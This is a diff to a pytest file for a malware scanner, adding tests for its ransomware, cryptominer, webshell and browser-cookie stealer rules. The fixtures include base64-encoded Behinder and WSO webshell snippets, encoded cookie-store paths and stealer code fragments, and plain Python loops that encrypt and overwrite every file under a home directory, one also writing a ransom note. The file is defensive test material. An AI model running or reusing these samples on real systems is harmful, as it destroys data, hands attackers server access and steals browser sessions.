@@ -418,6 +418,18 @@ def _perl_sh_helper_hyphen_fixture() -> str:
     ).decode()
 
 
+_WEBSHELL_FIXTURES = {
+    "behinder_php": "PD9waHAgQGVycm9yX3JlcG9ydGluZygwKTsgc2Vzc2lvbl9zdGFydCgpOyAka2V5PSJlNDVlMzI5ZmViNWQ5MjViIjsKJF9TRVNTSU9OWydrJ109JGtleTsgJHBvc3Q9ZmlsZV9nZXRfY29udGVudHMoInBocDovL2lucHV0Iik7CiRwb3N0PW9wZW5zc2xfZGVjcnlwdCgkcG9zdCwgIkFFUzEyOCIsICRrZXkpOyBldmFsKCRwb3N0KTsgPz4K",
+    "behinder_jsp": "PCVAcGFnZSBpbXBvcnQ9ImphdmEudXRpbC4qLGphdmF4LmNyeXB0by4qIiU+CjwlIFN0cmluZyBrPSJlNDVlMzI5ZmViNWQ5MjViIjsgc2Vzc2lvbi5wdXRWYWx1ZSgidSIsayk7CkNpcGhlciBjPUNpcGhlci5nZXRJbnN0YW5jZSgiQUVTIik7ICU+Cg==",
+    "wso_php": "PD9waHAgZGVmaW5lKCdXU09fVkVSU0lPTicsICcyLjUnKTsKZnVuY3Rpb24gd3NvRXgoJGluKSB7ICRvdXQ9Jyc7IGlmKGZ1bmN0aW9uX2V4aXN0cygnZXhlYycpKSB7IEBleGVjKCRpbiwkb3V0KTsgfQpyZXR1cm4gJG91dDsgfQo=",
+    "wso_mixed_case": "PD9waHAgZGVmaW5lKCJ3c29fdmVyc2lvbiIsICIyLjciKTsKZnVuY3Rpb24gV1NPRVgoJGluKSB7IHJldHVybiAkaW47IH0K",
+}
+
+
+def _webshell_fixture(name: str) -> str:
+    return base64.b64decode(_WEBSHELL_FIXTURES[name]).decode()
+
+
 def _python_read_file_between_connect_and_shell_fixture() -> str:
     """A real reverse shell that reads a local file (``key = open(...).read()``)
     between ``connect`` and ``os.dup2``.
@@ -599,6 +611,53 @@ def _single_line_perl_socket_shell() -> str:
         "bmFtZSgidGNwIikpOyBjb25uZWN0KFNPQ0ssc29ja2FkZHJfaW4oJHBvcnQsaW5ldF9hdG9u"
         "KCRpcCkpKTsgc3lzdGVtKCIvYmluL3NoIC1pIik7Cg=="
     ).decode()
+
+
+# Browser cookie-store paths an information stealer reads (base64 so the test
+# source itself carries no stealer indicator).
+_STEALER_COOKIE_PATHS = {
+    "chrome_windows": "b3MucGF0aC5qb2luKG9zLmVudmlyb25bJ0xPQ0FMQVBQREFUQSddLCAnR29vZ2xlJywgJ0Nocm9tZScsICdVc2VyIERhdGEnLCAnRGVmYXVsdCcsICdOZXR3b3JrJywgJ0Nvb2tpZXMnKQ==",
+    "edge_windows": "Y29weSAlTE9DQUxBUFBEQVRBJVxNaWNyb3NvZnRcRWRnZVxVc2VyIERhdGFcRGVmYXVsdFxOZXR3b3JrXENvb2tpZXMgb3V0LmRi",
+    "brave_linux": "fi8uY29uZmlnL0JyYXZlU29mdHdhcmUvQnJhdmUtQnJvd3Nlci9Vc2VyIERhdGEvRGVmYXVsdC9Db29raWVz",
+    "chrome_macos": "cGF0aCA9IGhvbWUgKyAiL0xpYnJhcnkvQXBwbGljYXRpb24gU3VwcG9ydC9Hb29nbGUvQ2hyb21lL0RlZmF1bHQvQ29va2llcyI=",
+    "opera_windows": "JHAgPSAiJGVudjpBUFBEQVRBXE9wZXJhIFNvZnR3YXJlXE9wZXJhIFN0YWJsZVxOZXR3b3JrXENvb2tpZXMi",
+    "firefox_profile": "c3JjID0gcHJvZmlsZV9kaXIgLyAnY29va2llcy5zcWxpdGUn",
+    "chrome_pathlib_spaced": "UGF0aC5ob21lKCkgLyAiQXBwRGF0YSIgLyAiTG9jYWwiIC8gIkdvb2dsZSIgLyAiQ2hyb21lIiAvICJVc2VyIERhdGEiIC8gIkRlZmF1bHQiIC8gIk5ldHdvcmsiIC8gIkNvb2tpZXMi",
+}
+
+
+def _stealer_cookie_path(name: str) -> str:
+    return base64.b64decode(_STEALER_COOKIE_PATHS[name]).decode()
+
+
+# Code that names the store before the browser, as the previous pattern did.
+_STEALER_COOKIE_CODE = {
+    "sqlite_connect": "Y29va2llc19kYiA9IHNxbGl0ZTMuY29ubmVjdChjaHJvbWVfcHJvZmlsZSArICIvQ29va2llcyIp",
+    "copy_to_output": "c2h1dGlsLmNvcHkocHJvZmlsZSAvICJDb29raWVzIiwgY2hyb21lX291dCk=",
+    "browser_constant": "ZGIgPSBvcy5wYXRoLmpvaW4oQ0hST01FX0RJUiwgIkRlZmF1bHQiLCAiQ29va2llcyIp",
+    "browser_argument": "c3RlYWwoIkNvb2tpZXMiLCAiZmlyZWZveCIp",
+    "keyword_argument": "Z3JhYl9jb29raWVzKGJyb3dzZXI9ImVkZ2UiKQ==",
+    "attribute_access": "Y29va2llcyA9IHJlYWQob3BlcmEucHJvZmlsZSk=",
+    "find_glob": "ZmluZCB+IC1uYW1lIENvb2tpZXMgLXBhdGggJypjaHJvbWUqJw==",
+    "quoted_path_segment": "c2h1dGlsLmNvcHkoaG9tZSArICIvQ29va2llcyIsICIvdG1wLyIgKyAiY2hyb21pdW0vIiArIG5hbWUp",
+    "dashed_path_segment": "c3JjID0gIkNvb2tpZXMiOyBkc3QgPSBwcm9maWxlX3Jvb3QgKyAiLy5jb25maWcvZ29vZ2xlLWNocm9tZS9vdXQi",
+}
+
+
+# Documentation that names the browser store and, later on the same line, a
+# browser or product name (issue #751: a Supabase skill description).
+_COOKIE_PROSE = [
+    "description: Auth issues (login, logout, sessions, JWT, cookies, getSession, getUser, "
+    "getClaims, RLS); Supabase CLI or MCP server; debugging timeouts, Edge Function crashes\n",
+    "Set cookies for Edge Functions with the SSR helper.\n",
+    "Cookies set by the Edge middleware are httpOnly.\n",
+    "Forward cookies to Chrome headless through the Playwright context.\n",
+    "Clear cookies in Chrome.\n",
+    "Cookies are shared with Edge, Chrome and Firefox.\n",
+    "Third-party cookies are blocked by Chrome's tracking protection.\n",
+    "Session cookies are dropped by Firefox's Enhanced Tracking Protection.\n",
+    "Cookies: Chrome/Edge supported, Safari planned.\n",
+]
 
 
 def _has_rule(findings: list, rule_name: str) -> bool:
@@ -1568,6 +1627,587 @@ class TestBuiltInMalwarePackaging:
         assert _has_rule(findings, "reverse_shell")
 
 
+class TestBuiltInRansomwareRule:
+    @pytest.mark.parametrize("filename", ["api.md", "wallet.txt", "wallet.py"])
+    @pytest.mark.parametrize(
+        "content",
+        [
+            "Send BTC on the returned network from an external wallet you control.",
+            "SEND BTC to fund your own account.",
+            "send 0.01 btc to your wallet on the correct network.",
+            "Pay with Bitcoin at checkout.",
+            "PAY the invoice using BITCOIN.",
+            "Send BTC to your wallet.\nBackups use encryption to protect account data.",
+            "Never pay Bitcoin ransomware demands; report them to your security team.",
+            "Never pay the ransom in Bitcoin; report the demand to your security team.",
+            "Do not pay a ransom with BTC. Restore from backups instead.",
+            "Your data has been encrypted. Never pay the ransom in Bitcoin; report it.",
+            "Your data has been encrypted. Do not pay the ransom in Bitcoin.",
+            "Send BTC after you recover your wallet backup.",
+            "Pay Bitcoin to unlock premium account features.",
+            "Send BTC for encrypted cloud backup storage.",
+            "Data recovery service: pay with Bitcoin at checkout.",
+            "Send BTC, then publish your transaction receipt.",
+            "Send BTC " + "x" * 161 + " to receive the decryption key.",
+            "Your files are encrypted at rest and in transit with AES-256.",
+            "Your files have been encrypted at rest with AES-256.",
+            "Your files are encrypted in transit using TLS.",
+            "YOUR FILES HAVE BEEN ENCRYPTED\tAT\tREST.",
+        ],
+    )
+    def test_wallet_payment_text_is_not_ransomware(self, content, filename):
+        findings = _run_builtin(content, filename)
+
+        assert not _has_rule(findings, "ransomware_behavior")
+
+    @pytest.mark.parametrize(
+        "content",
+        [
+            "Your files are encrypted.",
+            "Your files have been encrypted.",
+            "YOUR FILES ARE ENCRYPTED. Send BTC for recovery.",
+            "your\tfiles\thave\tbeen\tencrypted",
+            "your\nfiles\nare\nencrypted",
+            "All of your files are encrypted with RSA-2048 and AES-128 ciphers.",
+            "All your files have been encrypted due to a security problem with your PC.",
+            "Your files have been encrypted by LockBit 3.0",
+            "Your files have been encrypted, and the only way to get them back is to pay us.",
+            "Your files have been encrypted with AES. Send XMR for recovery.",
+        ],
+    )
+    def test_encrypted_files_notice_remains_critical(self, content):
+        findings = _run_builtin("# Notice\n\n" + content, "notice.md")
+        ransomware = [f for f in findings if "ransomware_behavior" in f.message]
+
+        assert len(ransomware) == 1
+        finding = ransomware[0]
+        assert finding.rule_id == "YR1"
+        assert finding.severity == "CRITICAL"
+        assert finding.confidence == 0.8
+        assert finding.file == "notice.md"
+        assert finding.start_line == 3
+        assert finding.matched_text
+        assert "encrypted" in finding.matched_text.lower()
+
+    @pytest.mark.parametrize(
+        "content",
+        [
+            "Your files are locked. Send BTC to receive the decryption key.",
+            "Your data has been encrypted. Pay the ransom in Bitcoin to recover your files.",
+            "You must pay the ransom in Bitcoin to recover your files.",
+            "Send 0.5 BTC to obtain the decryption key.",
+            "Don't forget to send 0.5 BTC to example.invalid to decrypt your files.",
+            "Do not hesitate to pay 1 bitcoin to restore your files.",
+            "You have to pay for decryption in Bitcoins to recover your files.",
+            "Send 0.5 Bitcoins to decrypt your files.",
+            "To restore your files, pay 1 Bitcoins.",
+            "Pay the ransom in Bitcoins.",
+            "To receive the decryption key, send 1 BTC.",
+            "We will delete your files unless you pay 0.5 Bitcoin.",
+            "Send BTC or we will publish your data.",
+            "Pay Bitcoin or your files will be destroyed.",
+            "Your data has been encrypted.\nPay the ransom in Bitcoin.",
+            "Send 0.5 BTC to <addr> to decrypt your files.",
+            "Pay 1 bitcoin within 72 hours or your files will be lost forever.",
+            "To recover your files, pay 0.3 Bitcoin to <addr>.",
+            "Send BTC\nTo receive the decryption key, contact support.",
+            (
+                "Your documents, photos and databases have been encrypted.\n"
+                "To decrypt them, send 0.5 BTC to <addr>."
+            ),
+            (
+                "Send 0.5 BTC to <addr>.\n"
+                "After payment you will get the decryption key.\n"
+                "If payment is not received, your files will be deleted."
+            ),
+        ],
+    )
+    def test_payment_with_explicit_extortion_context_remains_critical(self, content):
+        findings = _run_builtin(content, "notice.md")
+        ransomware = [f for f in findings if "ransomware_behavior" in f.message]
+
+        assert len(ransomware) == 1
+        assert ransomware[0].rule_id == "YR1"
+        assert ransomware[0].severity == "CRITICAL"
+        assert ransomware[0].confidence == 0.8
+
+    @pytest.mark.parametrize("negator", ["Never", "Do not", "Don't", "Must not", "Should not"])
+    @pytest.mark.parametrize("modifier", ["", " ever"])
+    @pytest.mark.parametrize("payment", ["pay", "send"])
+    @pytest.mark.parametrize("context_first", [False, True])
+    def test_only_directly_negated_payments_are_filtered(
+        self, negator, modifier, payment, context_first
+    ):
+        demand = f"{negator}{modifier} {payment} 0.5 Bitcoins"
+        content = (
+            f"To recover your files, {demand}."
+            if context_first
+            else f"{demand} to decrypt your files."
+        )
+
+        assert not _has_rule(_run_builtin(content), "ransomware_behavior")
+
+    @pytest.mark.parametrize(
+        "content",
+        [
+            "If you don't pay 0.5 bitcoin within 48 hours, your files will be deleted.",
+            "If you don’t pay 0.5 bitcoin within 48 hours, your files will be deleted.",
+            "If you do not pay 1 Bitcoin within 72 hours, all your files will be lost forever.",
+            "If you do not send 1 BTC to the address below, we will publish your stolen data.",
+            "Never pay less than 1 bitcoin or your files will be deleted.",
+            "Never send less than 0.5 BTC to decrypt your files.",
+            "Do not pay less than 1 BTC or your files will be destroyed.",
+            "Don't send anything less than 0.5 BTC to decrypt your files.",
+            (
+                "We have downloaded your confidential data.\n"
+                "If you do not send 5 BTC to the address below within 72 hours, "
+                "we will publish your stolen data."
+            ),
+            (
+                "All your important files are encrypted!\n"
+                "If you don't pay 0.5 bitcoin within 48 hours, your files will be deleted."
+            ),
+        ],
+    )
+    def test_conditional_and_minimum_amount_demands_remain_critical(self, content):
+        ransomware = [
+            finding
+            for finding in _run_builtin(content, "notice.md")
+            if "ransomware_behavior" in finding.message
+        ]
+
+        assert len(ransomware) == 1
+        assert ransomware[0].rule_id == "YR1"
+        assert ransomware[0].severity == "CRITICAL"
+        assert ransomware[0].start_line == content.count("\n") + 1
+
+    @pytest.mark.parametrize(
+        "content",
+        [
+            "Never send BTC to strangers.",
+            "Never send BTC to anyone who promises to decrypt your files.",
+            "Never pay the ransom in Bitcoin; report it to your security team.",
+            "Do not pay the ransom in Bitcoin.",
+            "If you are attacked, do not pay the ransom in Bitcoin.",
+            "You should never pay the ransom in Bitcoin.",
+            "You must not send BTC to anyone who offers to decrypt your files.",
+            "- Never pay the ransom in Bitcoin.",
+            "> **Never** pay the ransom in Bitcoin.",
+            "1. Do not send BTC to anyone who offers to decrypt your files.",
+            "Don’t send BTC to anyone promising to decrypt your files.",
+        ],
+    )
+    def test_clause_opening_payment_advice_is_not_ransomware(self, content):
+        assert not _has_rule(_run_builtin(content, "advice.md"), "ransomware_behavior")
+
+    @pytest.mark.parametrize(
+        "content",
+        [
+            "To decrypt your files you must send\n0.5 BTC to the address below.",
+            "To decrypt your files you must send\r\n0.5 BTC to the address below.",
+            "Send 1 BTC to the wallet below\nto decrypt\nyour files.",
+            (
+                "Your network has been breached and your documents are locked. To decrypt\n"
+                "your files you must send 0.5 BTC to the address below."
+            ),
+            (
+                "Your network has been breached and your documents are locked. To decrypt your\n"
+                "files you must pay 0.5 bitcoin to the address below."
+            ),
+            "Pay the\nransom in Bitcoin.",
+            "Pay the ransom\nin Bitcoin.",
+            "Send 0.5BTC to example.invalid to decrypt your files.",
+            "To restore your files, pay 1bitcoin.",
+        ],
+    )
+    def test_hard_wrapped_and_glued_amount_demands_remain_critical(self, content):
+        ransomware = [
+            finding
+            for finding in _run_builtin(content, "notice.txt")
+            if "ransomware_behavior" in finding.message
+        ]
+
+        assert len(ransomware) == 1
+        assert ransomware[0].rule_id == "YR1"
+        assert ransomware[0].severity == "CRITICAL"
+        assert ransomware[0].start_line == 1
+
+    @pytest.mark.parametrize("filler, expected", [(79, True), (80, False)])
+    def test_wrapped_payment_currency_window_remains_bounded(self, filler, expected):
+        content = "To decrypt your files you must send\n" + "x" * filler + " BTC."
+
+        assert _has_rule(_run_builtin(content, "notice.txt"), "ransomware_behavior") is expected
+
+    def test_payment_currency_allows_only_one_line_break(self):
+        content = "To decrypt your files you must send\n\n0.5 BTC to the address below."
+
+        assert not _has_rule(_run_builtin(content, "notice.txt"), "ransomware_behavior")
+
+    def test_negated_advice_does_not_own_a_later_wrapped_demand(self):
+        content = "Never send BTC to strangers.\nSend 1 BTC to decrypt your files.\n"
+
+        ransomware = [
+            finding
+            for finding in _run_builtin(content, "notice.md")
+            if "ransomware_behavior" in finding.message
+        ]
+
+        assert len(ransomware) == 1
+        assert ransomware[0].start_line == 2
+        assert ransomware[0].matched_text.startswith("Send 1 BTC")
+
+    @pytest.mark.parametrize("separator", ["\n", "\r\n"])
+    def test_storage_notice_does_not_hide_later_encryption_notice(self, separator):
+        content = (
+            "Your files are encrypted at rest with AES-256."
+            + separator
+            + "Your files have been encrypted by a ransomware operator."
+        )
+        ransomware = [
+            finding
+            for finding in _run_builtin(content, "notice.md")
+            if "ransomware_behavior" in finding.message
+        ]
+
+        assert len(ransomware) == 1
+        assert ransomware[0].start_line == 2
+        assert ransomware[0].matched_text == "Your files have been encrypted"
+        assert ransomware[0].match_fingerprint
+
+    def test_storage_notice_does_not_hide_independent_payment_demand(self):
+        content = (
+            "Your files are encrypted at rest with AES-256." + " " * 161 + "\n"
+            "Don't forget to send 0.5 BTC to decrypt your files."
+        )
+        ransomware = [
+            finding
+            for finding in _run_builtin(content, "notice.md")
+            if "ransomware_behavior" in finding.message
+        ]
+
+        assert len(ransomware) == 1
+        assert ransomware[0].start_line == 2
+        assert ransomware[0].matched_text.startswith("send 0.5 BTC")
+
+    def test_clipped_prefix_cannot_manufacture_a_negator_word(self):
+        content = "xnever" + " " * 75 + "send BTC to decrypt your files."
+
+        assert _has_rule(_run_builtin(content), "ransomware_behavior")
+
+    def test_storage_filter_does_not_change_custom_rule_evidence(self, tmp_path):
+        _write_rule(
+            tmp_path,
+            "ransomware_behavior",
+            category="malware",
+            severity="CRITICAL",
+            strings={"ransom_note": "Your files are encrypted at rest"},
+        )
+
+        findings = _run("Your files are encrypted at rest.", "storage.md", str(tmp_path))
+
+        assert len(findings) == 1
+        assert findings[0].matched_text == "Your files are encrypted at rest"
+        assert "[malware]" not in findings[0].message
+
+    @pytest.mark.parametrize("spacing, expected", [(160, True), (161, False)])
+    @pytest.mark.parametrize("context_first", [False, True])
+    def test_cross_line_extortion_window_remains_bounded(self, spacing, expected, context_first):
+        gap = "\n" + "x" * (spacing - 2) + " "
+        content = (
+            "to decrypt your files" + gap + "send BTC"
+            if context_first
+            else "send BTC" + gap + "to decrypt your files"
+        )
+
+        assert _has_rule(_run_builtin(content), "ransomware_behavior") is expected
+
+    def test_real_demand_after_negated_advice_supplies_evidence_and_location(self):
+        content = (
+            "Never pay the ransom in Bitcoin; report the demand.\nPay the ransom in Bitcoin.\n"
+        )
+
+        findings = _run_builtin(content, "notice.md")
+        ransomware = [finding for finding in findings if "ransomware_behavior" in finding.message]
+
+        assert len(ransomware) == 1
+        assert ransomware[0].start_line == 2
+        assert ransomware[0].matched_text == "Pay the ransom in Bitcoin"
+
+    @pytest.mark.parametrize(
+        "content",
+        [
+            "os.walk(root) ... .encrypt(data)",
+            "os.walk(root) ... .cipher(data)",
+            "os.rename(path, path + '.locked')",
+            "os.rename(path, path + '.encrypted')",
+            "os.rename(path, path + '.crypt')",
+            "os.rename(path, path + '.enc')",
+            "os.walk(root) ... open(path, 'wb')",
+        ],
+    )
+    def test_behavior_indicators_remain_detected(self, content):
+        # Inert source fragments are scanned as text, never executed.
+        findings = _run_builtin(content, "sample.txt")
+
+        assert _has_rule(findings, "ransomware_behavior")
+
+    def test_multiline_encrypt_and_drop_note_script_is_detected(self):
+        content = """\
+from cryptography.fernet import Fernet
+import os
+
+for root, _dirs, files in os.walk(os.path.expanduser("~")):
+    for filename in files:
+        path = os.path.join(root, filename)
+        with open(path, "rb") as source:
+            encrypted = Fernet(key).encrypt(source.read())
+        with open(path, "wb") as destination:
+            destination.write(encrypted)
+
+with open("README_RESTORE_FILES.txt", "w") as note:
+    note.write("Your documents have been encrypted.\\n")
+    note.write("Send 0.5 BTC to <addr> to decrypt your files.\\n")
+"""
+
+        findings = _run_builtin(content, "encrypt.py")
+
+        assert _has_rule(findings, "ransomware_behavior")
+
+    @pytest.mark.parametrize(
+        "content",
+        [
+            pytest.param(
+                """\
+import os
+from cryptography.fernet import Fernet
+
+fernet = Fernet(Fernet.generate_key())
+for root, _dirs, files in os.walk(os.path.expanduser("~")):
+    for name in files:
+        path = os.path.join(root, name)
+        with open(path, "rb") as source:
+            data = source.read()
+        with open(path, "wb") as destination:
+            destination.write(fernet.encrypt(data))
+""",
+                id="overwrite-in-walk-loop",
+            ),
+            pytest.param(
+                """\
+import os
+from cryptography.fernet import Fernet
+
+fernet = Fernet(Fernet.generate_key())
+
+
+def lock(path):
+    with open(path, "rb") as source:
+        data = source.read()
+    with open(path, "wb") as destination:
+        destination.write(fernet.encrypt(data))
+
+
+for root, _dirs, files in os.walk(os.path.expanduser("~/Documents")):
+    for name in files:
+        lock(os.path.join(root, name))
+""",
+                id="helper-defined-before-walk",
+            ),
+            pytest.param(
+                """\
+import os
+from Crypto.Cipher import AES
+
+cipher = AES.new(key, AES.MODE_CTR)
+for root, _dirs, files in os.walk("/home"):
+    for name in files:
+        with open(os.path.join(root, name), "r+b") as handle:
+            data = handle.read()
+            handle.seek(0)
+            handle.write(cipher.encrypt(data))
+""",
+                id="read-write-in-place",
+            ),
+        ],
+    )
+    def test_multiline_walk_encrypt_overwrite_without_note_is_detected(self, content):
+        # Without a ransom note, ``ransomware_behavior`` only fires when
+        # ``os.walk`` shares a line with the encrypt/open call.
+        findings = _run_builtin(content, "organize.py")
+
+        heuristic = _findings_from_rule(findings, "ransomware_behavior_multiline")
+        assert len(heuristic) == 1
+        assert heuristic[0].rule_id == "YR1"
+        assert heuristic[0].severity == "HIGH"
+        assert heuristic[0].confidence == 0.6
+        assert not _findings_from_rule(findings, "ransomware_behavior")
+
+    @pytest.mark.parametrize(
+        "content",
+        [
+            pytest.param(
+                """\
+import os
+import requests
+
+for root, _dirs, files in os.walk("assets"):
+    print(root, len(files))
+response = requests.get("https://example.com/model.bin")
+with open("model.bin", "wb") as handle:
+    handle.write(response.content)
+""",
+                id="walk-and-download-without-encryption",
+            ),
+            pytest.param(
+                """\
+import hashlib
+import os
+
+for root, _dirs, files in os.walk("."):
+    for name in files:
+        with open(os.path.join(root, name), "rb") as handle:
+            print(hashlib.sha256(handle.read()).hexdigest(), name)
+""",
+                id="walk-and-hash-read-only",
+            ),
+            pytest.param(
+                """\
+import sys
+from cryptography.fernet import Fernet
+
+fernet = Fernet(open("key", "rb").read())
+with open(sys.argv[1], "rb") as source:
+    data = source.read()
+with open(sys.argv[1] + ".enc", "wb") as destination:
+    destination.write(fernet.encrypt(data))
+""",
+                id="single-file-encryption-without-walk",
+            ),
+            pytest.param(
+                "import os\nfor root, _dirs, files in os.walk('.'):\n    print(root)\n"
+                + "# unrelated\n" * 100
+                + "with open('out.bin', 'wb') as handle:\n"
+                + "    handle.write(cipher.encrypt(b'data'))\n",
+                id="walk-far-from-encrypt-and-write",
+            ),
+        ],
+    )
+    def test_multiline_walk_without_nearby_encrypt_and_write_is_not_ransomware(self, content):
+        findings = _run_builtin(content, "tool.py")
+
+        assert not _has_rule(findings, "ransomware_behavior")
+
+    def test_single_line_walk_encrypt_reports_only_the_certain_rule(self):
+        content = (
+            "for root, _, files in os.walk(home): "
+            "[open(os.path.join(root, n), 'wb').write(f.encrypt(b'')) for n in files]\n"
+        )
+
+        findings = _run_builtin(content, "organize.py")
+
+        certain = _findings_from_rule(findings, "ransomware_behavior")
+        assert len(certain) == 1
+        assert certain[0].severity == "CRITICAL"
+        assert not _findings_from_rule(findings, "ransomware_behavior_multiline")
+
+    def test_wallet_text_still_reaches_custom_rules(self, tmp_path):
+        _write_rule(
+            tmp_path,
+            "wallet_policy",
+            category="hack_tool",
+            severity="MEDIUM",
+            strings={"payment": "Send BTC"},
+        )
+
+        findings = _run("Send BTC to your own wallet.", "api.md", str(tmp_path))
+
+        assert _has_rule(findings, "wallet_policy")
+        assert not _has_rule(findings, "ransomware_behavior")
+
+
+# ── Built-in cryptominer rules ───────────────────────────────────────
+
+
+class TestBuiltInCryptominerRules:
+    """Regression coverage for crypto_coinjacking's $wasm_miner string.
+
+    Unbounded ``(mine|hash|crypto)`` matched inside unrelated identifiers
+    (``deteRMINE``) and against common, benign Web APIs/module names
+    (``crypto.getRandomValues``, ``hashmap``) that routinely appear near any
+    ``WebAssembly.instantiate`` call, firing a CRITICAL cryptojacking finding
+    on ordinary code.
+    """
+
+    def test_wasm_instantiate_with_unrelated_hash_call_is_not_coinjacking(self):
+        content = "WebAssembly.instantiate(bytes).then(r=>{ hashmap.set(r,1) })\n"
+        findings = _run_builtin(content, "loader.js")
+        assert not _has_rule(findings, "crypto_coinjacking")
+
+    def test_wasm_instantiate_with_web_crypto_api_is_not_coinjacking(self):
+        content = "WebAssembly.instantiate(bytes).then(r=>{ crypto.getRandomValues(buf) })\n"
+        findings = _run_builtin(content, "loader.js")
+        assert not _has_rule(findings, "crypto_coinjacking")
+
+    def test_wasm_instantiate_with_mid_word_mine_is_not_coinjacking(self):
+        content = "WebAssembly.instantiate(bytes).then(r=>{ return determine(r) })\n"
+        findings = _run_builtin(content, "loader.js")
+        assert not _has_rule(findings, "crypto_coinjacking")
+
+    def test_wasm_instantiate_with_text_mining_prose_is_not_coinjacking(self):
+        """`mining` as English prose must not fire; only a mining call does."""
+        content = (
+            "WebAssembly.instantiate(bytes).then(m=>runAnalytics(m)); // helpers for text mining\n"
+        )
+        findings = _run_builtin(content, "loader.js")
+        assert not _has_rule(findings, "crypto_coinjacking")
+
+    def test_wasm_instantiate_with_start_mining_call_is_coinjacking(self):
+        """`startMining(` is a mining call even though `Mining` is mid-identifier."""
+        content = "WebAssembly.instantiate(w).then(m=>{ m.exports.startMining(pool) })\n"
+        findings = _run_builtin(content, "loader.js")
+        assert _has_rule(findings, "crypto_coinjacking")
+
+    def test_wasm_instantiate_with_capitalised_miner_is_coinjacking(self):
+        """Case must not matter: `new Miner(` is the common CoinHive-era shape."""
+        content = "WebAssembly.instantiate(w).then(m=>{ var x = new Miner(siteKey) })\n"
+        findings = _run_builtin(content, "loader.js")
+        assert _has_rule(findings, "crypto_coinjacking")
+
+    def test_wasm_instantiate_with_literal_miner_call_is_coinjacking(self):
+        content = "WebAssembly.instantiate(minerWasm).then(function(m){ m.exports.mine(); })\n"
+        findings = _run_builtin(content, "loader.js")
+        assert _has_rule(findings, "crypto_coinjacking")
+
+    def test_wasm_instantiate_with_cryptonight_glue_is_coinjacking(self):
+        content = (
+            "WebAssembly.instantiate(wasmBinary,info);"
+            "var _cryptonight_hash=Module._cryptonight_hash=function(){};\n"
+        )
+        findings = _run_builtin(content, "loader.js")
+        assert _has_rule(findings, "crypto_coinjacking")
+
+    def test_wasm_instantiate_with_hash_cn_cwrap_is_coinjacking(self):
+        content = 'WebAssembly.instantiate(x).then(()=>{ Module.cwrap("hash_cn", "number", ["number"]) })\n'
+        findings = _run_builtin(content, "loader.js")
+        assert _has_rule(findings, "crypto_coinjacking")
+
+    def test_wasm_instantiate_with_cryptonight_wasm_fetch_is_coinjacking(self):
+        content = (
+            'WebAssembly.instantiateStreaming(fetch("cryptonight.wasm"))'
+            ".then(o=>{ exports.cn_hash(blob,nonce++) })\n"
+        )
+        findings = _run_builtin(content, "loader.js")
+        assert _has_rule(findings, "crypto_coinjacking")
+
+    def test_wasm_instantiate_with_randomx_calculate_hash_is_coinjacking(self):
+        content = (
+            "WebAssembly.instantiate(randomxWasm)"
+            ".then(m=>m.instance.exports.randomx_calculate_hash(blob))\n"
+        )
+        findings = _run_builtin(content, "loader.js")
+        assert _has_rule(findings, "crypto_coinjacking")
+
+
 # ── Built-in agent skill rules ────────────────────────────────────────
 
 
@@ -1736,6 +2376,82 @@ rule agent_skill_destructive_autonomous_actions {
 """
         findings = _run_builtin(content, "README.md")
         assert not _has_rule(findings, "agent_skill_credential_exfiltration_webhook")
+
+    @pytest.mark.parametrize(
+        "content",
+        [
+            "Zu kleine Schrift behindert das Lesen. Menschen mit Behinderung\n"
+            "brauchen ausreichende Kontraste.\n",
+            "We deploy the API on WSO 2 Micro Integrator.\n",
+            "This skill detects Behinder and WSO webshells in uploaded files.\n",
+        ],
+        ids=["german_prose", "wso2_product_name", "family_names_in_docs"],
+    )
+    def test_known_webshell_rule_ignores_prose(self, content):
+        findings = _run_builtin(content, "SKILL.md")
+        assert not _has_rule(findings, "php_webshell_known")
+
+    @pytest.mark.parametrize(
+        "content",
+        [
+            "<?php define('WSO_VERSION', '0.5.2'); ?>\n",
+            "function wsoEx($input) { return $input; }\n",
+            "function wsoSecParam($name, $value) { return $value; }\n",
+            "Known indicator: e45e329feb5d925b\n",
+        ],
+        ids=["version_constant", "execution_helper", "security_helper", "key_in_docs"],
+    )
+    def test_known_webshell_rule_ignores_isolated_family_markers(self, content):
+        findings = _run_builtin(content, "reference.php")
+        assert not _has_rule(findings, "php_webshell_known")
+
+    @pytest.mark.parametrize(
+        ("fixture", "filename"),
+        [
+            ("behinder_php", "shell.php"),
+            ("behinder_jsp", "shell.jsp"),
+            ("wso_php", "shell.php"),
+            ("wso_mixed_case", "shell.php"),
+        ],
+    )
+    def test_known_webshell_rule_matches_family_markers(self, fixture, filename):
+        findings = _run_builtin(_webshell_fixture(fixture), filename)
+        assert _has_rule(findings, "php_webshell_known")
+
+    @pytest.mark.parametrize(
+        "content",
+        _COOKIE_PROSE,
+        ids=[
+            "supabase_description",
+            "edge_functions",
+            "edge_middleware",
+            "chrome_headless",
+            "clear_in_chrome",
+            "shared_with_browsers",
+            "chrome_possessive",
+            "firefox_possessive",
+            "browser_list_with_slash",
+        ],
+    )
+    def test_info_stealer_ignores_cookie_prose(self, content):
+        findings = _run_builtin(content, "SKILL.md")
+        assert not _has_rule(findings, "info_stealer")
+
+    @pytest.mark.parametrize("name", sorted(_STEALER_COOKIE_PATHS))
+    def test_info_stealer_matches_browser_cookie_store_paths(self, name):
+        findings = _run_builtin(_stealer_cookie_path(name) + "\n", "collect.py")
+        assert _has_rule(findings, "info_stealer")
+
+    @pytest.mark.parametrize("name", sorted(_STEALER_COOKIE_CODE))
+    def test_info_stealer_matches_code_naming_the_store_first(self, name):
+        code = base64.b64decode(_STEALER_COOKIE_CODE[name]).decode()
+        findings = _run_builtin(code + "\n", "collect.py")
+        assert _has_rule(findings, "info_stealer")
+
+    def test_info_stealer_matches_cookie_store_path_next_to_prose(self):
+        content = _COOKIE_PROSE[1] + _stealer_cookie_path("chrome_windows") + "\n"
+        findings = _run_builtin(content, "collect.py")
+        assert _has_rule(findings, "info_stealer")
 
 
 # ── Rule caching ──────────────────────────────────────────────────────
@@ -3041,142 +3757,3 @@ class TestRuleSkipAccounting:
         )
         assert all(row["unaccounted"] == 0 for row in yara_statuses)
         assert all(row["status"] == "degraded" for row in yara_statuses)
-
-
-class TestBuiltInMultilineRansomwareRule:
-    @pytest.mark.parametrize(
-        "content",
-        [
-            pytest.param(
-                """\
-import os
-from cryptography.fernet import Fernet
-
-fernet = Fernet(Fernet.generate_key())
-for root, _dirs, files in os.walk(os.path.expanduser("~")):
-    for name in files:
-        path = os.path.join(root, name)
-        with open(path, "rb") as source:
-            data = source.read()
-        with open(path, "wb") as destination:
-            destination.write(fernet.encrypt(data))
-""",
-                id="overwrite-in-walk-loop",
-            ),
-            pytest.param(
-                """\
-import os
